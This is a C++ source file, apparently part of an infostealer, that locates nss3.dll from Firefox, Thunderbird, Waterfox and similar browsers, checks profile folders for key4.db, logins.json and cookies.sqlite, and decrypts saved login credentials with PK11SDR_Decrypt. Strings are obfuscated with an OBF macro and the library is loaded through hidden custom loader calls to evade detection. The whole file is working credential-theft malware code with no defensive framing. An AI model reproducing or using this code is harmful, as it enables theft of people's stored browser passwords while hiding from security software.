#include "nss3.hpp"
#include "base64.hpp"
#include <Windows.h>
#include <filesystem>
#include "winapi_structs.hpp"
#include "os.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

static HMODULE nss3_handle = nullptr;
static std::string nss3_path;

static std::string FindNSSDLL() {
    std::string paths[] = { OBF("C:\\Program Files\\"), OBF("C:\\Program Files (x86)\\") };
    static const char* nss3_dirs[] = { OBF("Mozilla Firefox"), OBF("Mozilla Thunderbird"), OBF("Nightly"), OBF("Waterfox"), OBF("Pale Moon"), OBF("SeaMonkey") };

    for (const auto& basePath : paths) {
        for (const auto& dir : nss3_dirs) {
            std::string fullPath = basePath + dir + OBF("\\nss3.dll");
            if (fs::exists(fullPath)) {
                return fullPath;
            }
        }
    }
    return "";
}

std::string GetLastErrorMessage() {
    DWORD error = GetLastError();
    if (error == 0) return OBF("No error");

    LPSTR errorMsg = nullptr;
    DWORD msgLen = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, error, 0, reinterpret_cast<LPSTR>(&errorMsg), 0, nullptr);

    std::string errorMessage(errorMsg, msgLen);
    LocalFree(errorMsg);
    return errorMessage;
}

bool ValidateProfilePath(const std::string& profile) {
    std::string key4Path = profile + OBF("\\key4.db");
    std::string cert9Path = profile + OBF("\\cert9.db");
    std::string loginsPath = profile + OBF("\\logins.json");
    std::string cookiesPath = profile + OBF("\\cookies.sqlite");

    if (!fs::exists(key4Path) || !fs::exists(cert9Path) || !fs::exists(loginsPath) || !fs::exists(cookiesPath)) {
        return false;
    }

    return true;
}

bool LoadNSS() {
    if (nss3_handle) return true; // already loaded

    if (nss3_path.empty()) {
        nss3_path = FindNSSDLL();
        if (nss3_path.empty()) return false;
    }

    nss3_handle = HiddenCalls::CustomLoadLibraryExA(nss3_path.c_str(), LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!nss3_handle) {
        return false;
    }

    return true;
}



bool NSS::Initialize(const std::string& profilePath) {
    if (!LoadNSS()) return false;

    auto NSS_Init = reinterpret_cast<int(*)(const char*)>(HiddenCalls::CustomGetProcAddress(nss3_handle, OBF("NSS_Init")));
    if (!NSS_Init) {
        return false;
    }

    if (!ValidateProfilePath(profilePath)) {
        return false;
    }

    if (NSS_Init(profilePath.c_str()) != 0) {
        return false;
    }

    return true;
}

std::string NSS::PK11SDR_Decrypt(const std::string& profile, const std::string& encrypted) {
    if (!LoadNSS()) return "";

    auto NSS_Init = reinterpret_cast<int(*)(const char*)>(HiddenCalls::CustomGetProcAddress(nss3_handle, OBF("NSS_Init")));
    auto NSS_Shutdown = reinterpret_cast<int(*)()>(HiddenCalls::CustomGetProcAddress(nss3_handle, OBF("NSS_Shutdown")));
    auto PK11SDR_Decrypt = reinterpret_cast<int(*)(TSECItem*, TSECItem*, int)>(HiddenCalls::CustomGetProcAddress(nss3_handle, OBF("PK11SDR_Decrypt")));

    if (!NSS_Init || !NSS_Shutdown || !PK11SDR_Decrypt) {
        return "";
    }

    if (!ValidateProfilePath(profile)) return "";

    if (NSS_Init(profile.c_str()) != 0) {
        return "";
    }

    std::string decodedEncrypted = base64_decode(encrypted);
    if (decodedEncrypted.empty()) {
        NSS_Shutdown();
        return "";
    }

    TSECItem encryptedData{};
    encryptedData.SECItemType = 0;
    encryptedData.SECItemData = reinterpret_cast<unsigned char*>(const_cast<char*>(decodedEncrypted.data()));
    encryptedData.SECItemLen = decodedEncrypted.size();

    TSECItem decryptedData{};
    memset(&decryptedData, 0, sizeof(decryptedData));

    if (PK11SDR_Decrypt(&encryptedData, &decryptedData, 0) != 0) {
        NSS_Shutdown();
        return "";
    }

    if (!decryptedData.SECItemData || decryptedData.SECItemLen == 0) {
        NSS_Shutdown();
        return "";
    }

    std::string decrypted(reinterpret_cast<char*>(decryptedData.SECItemData), decryptedData.SECItemLen);
    SecureZeroMemory(decryptedData.SECItemData, decryptedData.SECItemLen);

    NSS_Shutdown();
    return decrypted;
}
